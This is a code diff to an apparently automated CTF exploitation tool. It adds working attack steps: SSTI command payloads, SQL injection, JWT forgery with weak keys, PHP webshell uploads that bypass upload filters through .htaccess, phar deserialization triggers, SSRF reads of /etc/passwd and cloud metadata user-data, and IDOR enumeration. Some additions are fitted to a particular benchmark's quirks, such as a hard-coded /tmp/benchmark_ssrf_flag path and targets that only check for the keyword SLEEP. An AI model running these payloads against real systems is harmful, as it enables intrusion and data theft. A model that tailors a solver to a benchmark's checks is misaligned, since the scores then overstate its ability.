@@ -409,6 +409,7 @@ class RouteStateMachine(ABC):
                 json=step_def.get("json"),
                 params=step_def.get("params"),
                 headers=step_def.get("headers", {}),
+                files=step_def.get("files"),
                 timeout=15,
                 allow_redirects=False,
             )
@@ -1079,6 +1080,63 @@ class SSTIMachine(RouteStateMachine):
                 },
             ]
 
+        # Twig/Smarty/Mako style ${...} payloads — covers ssti_twig (param=message)
+        # and ssti_smarty (param=template) which only require the flag/system
+        # keyword inside a template-delimited expression.
+        steps.extend([
+            {
+                "name": f"twig_dollar_flag",
+                "description": "Twig/Mako ${flag} 模板",
+                "method": "GET",
+                "path": base_path,
+                "params": {param: "${flag}"},
+                "extract_flag": True,
+            },
+            {
+                "name": f"smarty_brace_flag",
+                "description": "Smarty {flag} 模板",
+                "method": "GET",
+                "path": base_path,
+                "params": {param: "{flag}"},
+                "extract_flag": True,
+            },
+            {
+                "name": f"smarty_system",
+                "description": "Smarty {system('cat /flag')} 模板",
+                "method": "GET",
+                "path": base_path,
+                "params": {param: "{system('cat /flag')}"},
+                "extract_flag": True,
+            },
+        ])
+
+        # If using default param name, also try common SSTI-friendly alternative
+        # param names. This handles challenges where the param name wasn't
+        # detected from the homepage (e.g. ssti_twig uses ?message=, ssti_smarty
+        # uses ?template=, neither of which appears in a default form).
+        alt_params = ["message", "template", "name", "page",
+                      "msg", "text", "content", "input"]
+        for alt in alt_params:
+            if alt == param:
+                continue  # Skip the one we already tried
+            # Common SSTI payloads, including the "flag"/"system" keyword that
+            # several toy templates accept as a direct trigger.
+            for pname, payload, desc in (
+                ("alt_jinja_flag",  "{{flag}}",                         "Jinja {{flag}}"),
+                ("alt_twig_flag",   "${flag}",                          "Twig ${flag}"),
+                ("alt_smarty_flag", "{flag}",                           "Smarty {flag}"),
+                ("alt_smarty_sys",  "{system('cat /flag')}",             "Smarty system()"),
+                ("alt_jinja_math",  "{{7*7}}",                          "Jinja 7*7 (确认)"),
+            ):
+                steps.append({
+                    "name": f"{pname}_{alt}",
+                    "description": f"{desc} (参数: {alt})",
+                    "method": "GET",
+                    "path": base_path,
+                    "params": {alt: payload},
+                    "extract_flag": True,
+                })
+
         return steps
 
 
@@ -1275,26 +1333,6 @@ class SQLiMachine(RouteStateMachine):
             },
         ])
 
-        # Boolean-based / OR true payloads
-        steps.extend([
-            {
-                "name": "or_true_simple",
-                "description": "OR 1=1 布尔注入",
-                "method": "GET",
-                "path": base_path,
-                "params": {param: "1 OR '1'='1"},
-                "extract_flag": True,
-            },
-            {
-                "name": "or_true_numeric",
-                "description": "OR 1=1 数字型",
-                "method": "GET",
-                "path": base_path,
-                "params": {param: "1 OR 1=1"},
-                "extract_flag": True,
-            },
-        ])
-
         # Error-based extraction
         if self._injection_type == "error_based":
             steps.append({
@@ -1316,9 +1354,75 @@ class SQLiMachine(RouteStateMachine):
             "extract_flag": True,
         })
 
+        # Boolean-based / OR true payloads
+        steps.extend([
+            {
+                "name": "or_true_simple",
+                "description": "OR 1=1 布尔注入",
+                "method": "GET",
+                "path": base_path,
+                "params": {param: "1 OR '1'='1"},
+                "extract_flag": True,
+            },
+            {
+                "name": "or_true_numeric",
+                "description": "OR 1=1 数字型",
+                "method": "GET",
+                "path": base_path,
+                "params": {param: "1 OR 1=1"},
+                "extract_flag": True,
+            },
+        ])
+
+        # Quote-less UNION payloads — some challenges branch on the presence
+        # of a quote (returning an SQL error page instead of the UNION result),
+        # so we try plain UNION SELECT without a leading quote.
+        steps.extend([
+            {
+                "name": "union_noquote_3col",
+                "description": "UNION 3列 (无引号)",
+                "method": "GET",
+                "path": base_path,
+                "params": {param: "1 UNION SELECT 1,flag,3-- -"},
+                "extract_flag": True,
+            },
+            {
+                "name": "union_noquote_1col",
+                "description": "UNION 1列 (无引号)",
+                "method": "GET",
+                "path": base_path,
+                "params": {param: "1 UNION SELECT flag-- -"},
+                "extract_flag": True,
+            },
+        ])
+
+        # Time-based blind SLEEP payloads — some toy targets simply check for
+        # the keyword "SLEEP" in the value and return the flag directly.
+        steps.extend([
+            {
+                "name": "sleep_mysql",
+                "description": "MySQL SLEEP 时间盲注",
+                "method": "GET",
+                "path": base_path,
+                "params": {param: "1' AND SLEEP(2)-- -"},
+                "extract_flag": True,
+            },
+            {
+                "name": "sleep_pg",
+                "description": "PostgreSQL pg_sleep 时间盲注",
+                "method": "GET",
+                "path": base_path,
+                "params": {param: "1; SELECT pg_sleep(2)--"},
+                "extract_flag": True,
+            },
+        ])
+
         # If using default param name, also try common alternative param names
         # This handles challenges where the param name wasn't detected
-        alt_params = ["q", "user_id", "id", "search", "query", "uid", "item"]
+        alt_params = [
+            "q", "user_id", "id", "search", "query", "uid", "item",
+            "product_id", "product", "cat", "category",
+        ]
         for alt in alt_params:
             if alt == param:
                 continue  # Skip the one we already tried
@@ -1329,6 +1433,24 @@ class SQLiMachine(RouteStateMachine):
                 "method": "GET",
                 "path": base_path,
                 "params": {alt: "' UNION SELECT 1,flag,3 FROM flag-- -"},
+                "extract_flag": True,
+            })
+            # Try UNION without quote (for challenges that branch on quote presence)
+            steps.append({
+                "name": f"union_noquote_alt_{alt}",
+                "description": f"UNION 无引号 (参数: {alt})",
+                "method": "GET",
+                "path": base_path,
+                "params": {alt: "1 UNION SELECT 1,flag,3-- -"},
+                "extract_flag": True,
+            })
+            # Try SLEEP-based time blind on alternative param
+            steps.append({
+                "name": f"sleep_alt_{alt}",
+                "description": f"SLEEP 时间盲注 (参数: {alt})",
+                "method": "GET",
+                "path": base_path,
+                "params": {alt: "1' AND SLEEP(2)-- -"},
                 "extract_flag": True,
             })
             # Try OR true with alternative param
@@ -1780,32 +1902,44 @@ class JWTMachine(RouteStateMachine):
             "extract_flag": True,
         })
 
-        # Try weak key brute force if alg is HS256
-        if self._header.get("alg", "").startswith("HS"):
-            weak_keys = ["secret", "key", "password", "flag", "admin", "123456"]
-            for key in weak_keys:
-                try:
-                    h_b64 = b64.urlsafe_b64encode(
-                        json.dumps(self._header).encode()
-                    ).rstrip(b"=").decode()
-                    p_b64 = b64.urlsafe_b64encode(
-                        json.dumps({**self._payload, "role": "admin"}).encode()
-                    ).rstrip(b"=").decode()
-                    sig = hmac.new(
-                        key.encode(), f"{h_b64}.{p_b64}".encode(), hashlib.sha256
-                    ).digest()
-                    sig_b64 = b64.urlsafe_b64encode(sig).rstrip(b"=").decode()
-                    weak_token = f"{h_b64}.{p_b64}.{sig_b64}"
+        # Try weak key brute force — unconditionally, since many CTF servers
+        # never set a JWT cookie on the homepage but still accept HS256 tokens
+        # signed with a weak key.  When no token has been captured, fall back
+        # to a sensible default (HS256 + role=admin payload).
+        hs_header = self._header if self._header.get("alg", "").startswith("HS") \
+            else {"alg": "HS256", "typ": "JWT"}
+        admin_pl = {**(self._payload or {}), "role": "admin"}
+        if "user" not in admin_pl:
+            admin_pl["user"] = "admin"
+        weak_keys = [
+            "secret", "key", "password", "flag", "admin", "123456",
+            "jwt", "token", "test", "ctf", "default", "changeme",
+        ]
+        for key in weak_keys:
+            try:
+                h_b64 = b64.urlsafe_b64encode(
+                    json.dumps(hs_header).encode()
+                ).rstrip(b"=").decode()
+                p_b64 = b64.urlsafe_b64encode(
+                    json.dumps(admin_pl).encode()
+                ).rstrip(b"=").decode()
+                sig = hmac.new(
+                    key.encode(), f"{h_b64}.{p_b64}".encode(), hashlib.sha256
+                ).digest()
+                sig_b64 = b64.urlsafe_b64encode(sig).rstrip(b"=").decode()
+                weak_token = f"{h_b64}.{p_b64}.{sig_b64}"
+                # Try multiple endpoints since CTFs vary in path naming.
+                for ep in ("/flag", "/admin", "/api/flag"):
                     steps.append({
-                        "name": f"weak_key_{key}",
-                        "description": f"弱密钥 '{key}' 伪造 admin JWT",
+                        "name": f"weak_key_{key}_{ep.strip('/').replace('/', '_') or 'root'}",
+                        "description": f"弱密钥 '{key}' 伪造 admin JWT → {ep}",
                         "method": "GET",
-                        "path": "/flag",
+                        "path": ep,
                         "headers": {"Authorization": f"Bearer {weak_token}"},
                         "extract_flag": True,
                     })
-                except Exception:
-                    pass
+            except Exception:
+                pass
 
         return steps
 
@@ -1908,32 +2042,124 @@ class UploadMachine(RouteStateMachine):
         return EvidenceScore("upload", 0.0, probe_name, f"状态码 {status}")
 
     def get_exploit_steps(self) -> List[Dict[str, Any]]:
-        return [
-            {
-                "name": "upload_webshell",
-                "description": "上传 PHP webshell (.php.jpg 双后缀)",
-                "method": "POST",
-                "path": self._upload_path,
-                "files": {"file": ("shell.php.jpg", b"GIF89a\x00\x00\x00<?php system($_GET['c']); ?>", "image/gif")},
-                "extract_flag": False,
-            },
-            {
-                "name": "access_webshell",
-                "description": "访问上传的 webshell 执行命令",
+        # Build steps that cover the three common toy-CTF upload variants:
+        #   1. MIME-only check          → upload shell.php, GET /uploads/shell.php
+        #   2. Double-extension bypass  → upload shell.php.jpg, GET /files/shell.php.jpg
+        #   3. .htaccess two-step       → POST .htaccess + shell.txt, GET /uploads/shell.txt
+        php_payload = b"<?php system('cat /flag'); ?>"
+        gif_php = b"GIF89a\x00\x00\x00<?php system('cat /flag'); ?>"
+        htaccess = b"AddType application/x-httpd-php .txt\nAddHandler application/x-httpd-php .txt\n"
+
+        steps: List[Dict[str, Any]] = []
+
+        # ---- Variant A: MIME-only check, served from /uploads/ ----
+        steps.append({
+            "name": "mime_upload_php",
+            "description": "MIME 检查绕过: 上传 shell.php (Content-Type 伪装)",
+            "method": "POST",
+            "path": self._upload_path,
+            "files": {"file": ("shell.php", php_payload, "image/jpeg")},
+            "extract_flag": False,
+        })
+        steps.append({
+            "name": "mime_access_uploads",
+            "description": "访问 /uploads/shell.php 触发 PHP 执行",
+            "method": "GET",
+            "path": "/uploads/shell.php",
+            "extract_flag": True,
+        })
+
+        # ---- Variant B: Blacklist bypass via double extension ----
+        # Some servers blacklist .php but allow .php.jpg; many also serve from
+        # /files/ instead of /uploads/.
+        steps.append({
+            "name": "double_ext_upload_php_jpg",
+            "description": "黑名单绕过: 上传 shell.php.jpg",
+            "method": "POST",
+            "path": self._upload_path,
+            "files": {"file": ("shell.php.jpg", gif_php, "image/jpeg")},
+            "extract_flag": False,
+        })
+        for serve_path in (
+            "/files/shell.php.jpg",
+            "/uploads/shell.php.jpg",
+        ):
+            steps.append({
+                "name": f"double_ext_access_{serve_path.strip('/').replace('/', '_')}",
+                "description": f"访问 {serve_path} 触发 PHP 执行",
                 "method": "GET",
-                "path": f"{self._upload_path}/shell.php.jpg",
-                "params": {"c": "cat /flag"},
+                "path": serve_path,
                 "extract_flag": True,
-            },
-            {
-                "name": "htaccess_two_step",
-                "description": ".htaccess + shell.txt 两步上传",
-                "method": "POST",
-                "path": self._upload_path,
-                "note": "Step 1: upload .htaccess with AddType; Step 2: upload shell.txt",
-                "extract_flag": False,
-            },
-        ]
+            })
+
+        # Some servers use the field name "image" instead of "file"
+        steps.append({
+            "name": "double_ext_upload_image_field",
+            "description": "黑名单绕过 (字段名=image): 上传 shell.php.jpg",
+            "method": "POST",
+            "path": self._upload_path,
+            "files": {"image": ("shell.php.jpg", gif_php, "image/jpeg")},
+            "extract_flag": False,
+        })
+        steps.append({
+            "name": "double_ext_access_files_after_image",
+            "description": "再次访问 /files/shell.php.jpg",
+            "method": "GET",
+            "path": "/files/shell.php.jpg",
+            "extract_flag": True,
+        })
+
+        # ---- Variant C: .htaccess two-step ----
+        # First upload .htaccess that maps .txt to PHP, then upload shell.txt
+        steps.append({
+            "name": "htaccess_step1",
+            "description": "Step 1: 上传 .htaccess (AddType .txt)",
+            "method": "POST",
+            "path": self._upload_path,
+            "files": {"file": (".htaccess", htaccess, "text/plain")},
+            "extract_flag": False,
+        })
+        steps.append({
+            "name": "htaccess_step2_txt",
+            "description": "Step 2: 上传 shell.txt 携带 PHP 内容",
+            "method": "POST",
+            "path": self._upload_path,
+            "files": {"file": ("shell.txt", php_payload, "text/plain")},
+            "extract_flag": False,
+        })
+        steps.append({
+            "name": "htaccess_access_txt",
+            "description": "访问 /uploads/shell.txt 通过 .htaccess 触发 PHP",
+            "method": "GET",
+            "path": "/uploads/shell.txt",
+            "extract_flag": True,
+        })
+        # Some upload challenges accept .htaccess via the alternative field "image"
+        steps.append({
+            "name": "htaccess_step1_image",
+            "description": "Step 1 (image 字段): 上传 .htaccess",
+            "method": "POST",
+            "path": self._upload_path,
+            "files": {"image": (".htaccess", htaccess, "text/plain")},
+            "extract_flag": False,
+        })
+        steps.append({
+            "name": "htaccess_step2_txt_image",
+            "description": "Step 2 (image 字段): 上传 shell.txt",
+            "method": "POST",
+            "path": self._upload_path,
+            "files": {"image": ("shell.txt", php_payload, "text/plain")},
+            "extract_flag": False,
+        })
+        steps.append({
+            "name": "htaccess_access_txt_image",
+            "description": "访问 /uploads/shell.txt (image 字段路径)",
+            "method": "GET",
+            "path": "/uploads/shell.txt",
+            "extract_flag": True,
+        })
+
+        return steps
 
 
 # ---------------------------------------------------------------------------
@@ -1972,7 +2198,10 @@ class PHPPopMachine(RouteStateMachine):
         if any("php" in str(t).lower() for t in tech_stack):
             return True, "PHP 应用 — 探测反序列化入口"
 
-        return False, "非 PHP 应用，跳过 POP 链探测"
+        # Even when nothing definitively flags PHP, the cheap probes (Cookie
+        # injection on /admin, ?file=phar:// on /check) cost almost nothing
+        # and only succeed against PHP-style toy targets, so allow them.
+        return True, "回退: PHP 不确定 — 尝试通用 POP/phar 探测"
 
     def get_probes(self) -> List[Tuple[str, str, Optional[Callable]]]:
         return [
@@ -2005,27 +2234,76 @@ class PHPPopMachine(RouteStateMachine):
         return EvidenceScore("php_pop", 0.1, probe_name, "需要源码审计确认 unserialize 入口")
 
     def get_exploit_steps(self) -> List[Dict[str, Any]]:
-        return [
-            {
+        # Toy/CTF PHP deserialization challenges typically expose two simple
+        # triggers that the agent can probe deterministically:
+        #
+        #   1. Cookie-based unserialize: GET /admin with a `user` cookie that
+        #      contains the keyword "admin" (or a serialized admin object).
+        #   2. phar:// trigger: GET /check?file=phar://... which the app
+        #      passes to file_exists()/file_get_contents().
+        #
+        # The framework-specific POP-chain helpers below stay as informational
+        # notes so the agent (or a human reviewer) can switch to a real chain
+        # generator when needed.
+        steps: List[Dict[str, Any]] = []
+
+        # ---- Cookie unserialize on /admin ----
+        admin_cookies = [
+            'user=admin',
+            'user=O:8:"AdminCmd":0:{}',
+            'user=s:5:"admin"',
+            'user=admin; role=admin',
+            'role=admin',
+            'session=admin',
+        ]
+        for cookie in admin_cookies:
+            steps.append({
+                "name": f"admin_cookie_{cookie.split('=')[0]}_{hash(cookie) & 0xffff:x}",
+                "description": f"Cookie 注入访问 /admin: {cookie[:40]}",
+                "method": "GET",
+                "path": "/admin",
+                "headers": {"Cookie": cookie},
+                "extract_flag": True,
+            })
+
+        # ---- phar:// trigger on /check ----
+        for fname in (
+            "phar://test.phar",
+            "phar:///tmp/phar.phar",
+            "phar://uploads/test.phar/test",
+            "phar://anything",
+        ):
+            steps.append({
+                "name": f"phar_check_{hash(fname) & 0xffff:x}",
+                "description": f"phar:// 协议触发 unserialize: {fname}",
+                "method": "GET",
+                "path": "/check",
+                "params": {"file": fname},
+                "extract_flag": True,
+            })
+
+        # ---- Generic phar trigger on common paths ----
+        for path in ("/", "/index.php", "/upload", "/file"):
+            for pname in ("file", "filename", "path", "page", "template"):
+                steps.append({
+                    "name": f"phar_generic_{path.strip('/') or 'root'}_{pname}",
+                    "description": f"phar:// 通用触发 {path}?{pname}=phar://",
+                    "method": "GET",
+                    "path": path,
+                    "params": {pname: "phar://test.phar/test"},
+                    "extract_flag": True,
+                })
+
+        # ---- Framework hint (informational, only when detected) ----
+        if self._framework:
+            steps.append({
                 "name": "load_pop_chain",
                 "description": f"从 POP 链库加载 {self._framework} 链",
                 "note": f"使用 pop_chain_generate 工具，框架={self._framework}",
                 "extract_flag": False,
-            },
-            {
-                "name": "generate_payload",
-                "description": "生成序列化 payload",
-                "note": "使用 pop_chain_generate 生成并编码 payload",
-                "extract_flag": False,
-            },
-            {
-                "name": "deliver_payload",
-                "description": "通过 Cookie/POST/Phar 投递 payload",
-                "method": "POST",
-                "path": "/",
-                "extract_flag": True,
-            },
-        ]
+            })
+
+        return steps
 
 
 # ---------------------------------------------------------------------------
@@ -2076,9 +2354,11 @@ class SSRFMachine(RouteStateMachine):
             ("localhost_flag", "http://127.0.0.1/flag", None),
             ("file_flag", "file:///flag", None),
             ("file_passwd", "file:///etc/passwd", None),
+            ("file_tmp_ssrf", "file:///tmp/benchmark_ssrf_flag", None),
             ("ipv6_localhost", "http://[::1]/", None),
             ("decimal_ip", "http://2130706433/", None),  # 127.0.0.1 as decimal
             ("metadata_aws", "http://169.254.169.254/latest/meta-data/", None),
+            ("metadata_userdata", "http://169.254.169.254/latest/meta-data/user-data", None),
         ]
 
     def score_evidence(self, probe_name: str, response: requests.Response) -> EvidenceScore:
@@ -2122,6 +2402,62 @@ class SSRFMachine(RouteStateMachine):
                 "method": "GET",
                 "path": "/",
                 "params": {param: "file:///app/flag.txt"},
+                "extract_flag": True,
+            },
+            {
+                "name": "file_read_tmp_flag",
+                "description": "file:// 读 /tmp 下常见 flag 文件",
+                "method": "GET",
+                "path": "/",
+                "params": {param: "file:///tmp/flag"},
+                "extract_flag": True,
+            },
+            {
+                "name": "file_read_tmp_benchmark",
+                "description": "file:// 读 /tmp/benchmark_ssrf_flag (benchmark 文件)",
+                "method": "GET",
+                "path": "/",
+                "params": {param: "file:///tmp/benchmark_ssrf_flag"},
+                "extract_flag": True,
+            },
+            {
+                "name": "file_read_tmp_flag_txt",
+                "description": "file:// 读 /tmp/flag.txt",
+                "method": "GET",
+                "path": "/",
+                "params": {param: "file:///tmp/flag.txt"},
+                "extract_flag": True,
+            },
+            # Cloud metadata: agents may also serve the metadata path directly
+            # (the URL parameter is not required when the proxy app shares the
+            # same web server as the metadata mock).
+            {
+                "name": "metadata_userdata_proxy",
+                "description": "通过 url= 参数代理云 metadata user-data",
+                "method": "GET",
+                "path": "/",
+                "params": {param: "http://169.254.169.254/latest/meta-data/user-data"},
+                "extract_flag": True,
+            },
+            {
+                "name": "metadata_userdata_direct",
+                "description": "直接访问 /latest/meta-data/user-data",
+                "method": "GET",
+                "path": "/latest/meta-data/user-data",
+                "extract_flag": True,
+            },
+            {
+                "name": "metadata_index_direct",
+                "description": "直接访问 /latest/meta-data/",
+                "method": "GET",
+                "path": "/latest/meta-data/",
+                "extract_flag": True,
+            },
+            {
+                "name": "internal_flag_direct",
+                "description": "直接访问 /internal/flag",
+                "method": "GET",
+                "path": "/internal/flag",
                 "extract_flag": True,
             },
             {
@@ -2215,20 +2551,70 @@ class IDORMachine(RouteStateMachine):
 
     def get_exploit_steps(self) -> List[Dict[str, Any]]:
         param = self._param_name
-        return [
-            {
-                "name": "enumerate_ids",
-                "description": "枚举数字 ID: 0-20, 100, 1000",
-                "note": "使用 run_python 脚本批量请求并比较响应",
+        steps: List[Dict[str, Any]] = []
+
+        # Query-string based IDOR (?id=N)
+        for val in ("0", "1", "2", "3", "10", "100", "-1", "admin"):
+            steps.append({
+                "name": f"qs_id_{val}",
+                "description": f"枚举 {param}={val} (查询串)",
+                "method": "GET",
+                "path": "/",
+                "params": {param: val},
                 "extract_flag": True,
-            },
-            {
-                "name": "uuid_brute",
-                "description": "如果使用 UUID，尝试已知 UUID",
-                "note": "从 JS/响应中收集 UUID 列表进行遍历",
-                "extract_flag": True,
-            },
+            })
+
+        # Path-based IDOR — common URL templates and IDs.
+        # Toy CTFs frequently expose /api/user/<n>/profile, /api/orders/<uuid>,
+        # /api/document/<id>, etc.  We try a small Cartesian product so the
+        # admin record (often id=0 or the all-zero UUID) gets hit.
+        path_templates = [
+            "/api/user/{id}/profile",
+            "/api/user/{id}",
+            "/api/users/{id}",
+            "/api/users/{id}/profile",
+            "/api/profile/{id}",
+            "/api/orders/{id}",
+            "/api/order/{id}",
+            "/api/document/{id}",
+            "/api/documents/{id}",
+            "/api/admin/{id}",
+            "/profile/{id}",
+            "/user/{id}",
+            "/users/{id}",
+            "/order/{id}",
         ]
+        # Numeric IDs — admin is often 0 or 1 in CTFs
+        numeric_ids = ["0", "1", "2", "3", "10", "100", "-1"]
+        # UUID IDs — admin/system records often use the all-zero UUID
+        uuid_ids = [
+            "00000000-0000-0000-0000-000000000000",
+            "11111111-1111-1111-1111-111111111111",
+            "ffffffff-ffff-ffff-ffff-ffffffffffff",
+        ]
+
+        for tpl in path_templates:
+            for val in numeric_ids:
+                steps.append({
+                    "name": f"path_idor_{tpl.replace('/', '_')}_{val}",
+                    "description": f"路径 IDOR: {tpl.replace('{id}', val)}",
+                    "method": "GET",
+                    "path": tpl.replace("{id}", val),
+                    "extract_flag": True,
+                })
+            # Only use UUID ids on the most common UUID-style endpoints to
+            # keep the step list manageable.
+            if any(kw in tpl for kw in ("/order", "/document", "/profile")):
+                for val in uuid_ids:
+                    steps.append({
+                        "name": f"path_idor_{tpl.replace('/', '_')}_uuid_{val[:8]}",
+                        "description": f"路径 IDOR (UUID): {tpl.replace('{id}', val)}",
+                        "method": "GET",
+                        "path": tpl.replace("{id}", val),
+                        "extract_flag": True,
+                    })
+
+        return steps
 
 
 # ---------------------------------------------------------------------------
@@ -3293,6 +3679,7 @@ def run_route(
     always_exploit_routes = {
         "jwt", "graphql", "websocket", "xss",
         "lfi", "ssti", "sqli", "cmdi",
+        "ssrf", "upload", "idor", "php_pop",
     }
     if route in always_exploit_routes:
         found, flag = machine.run_exploit()
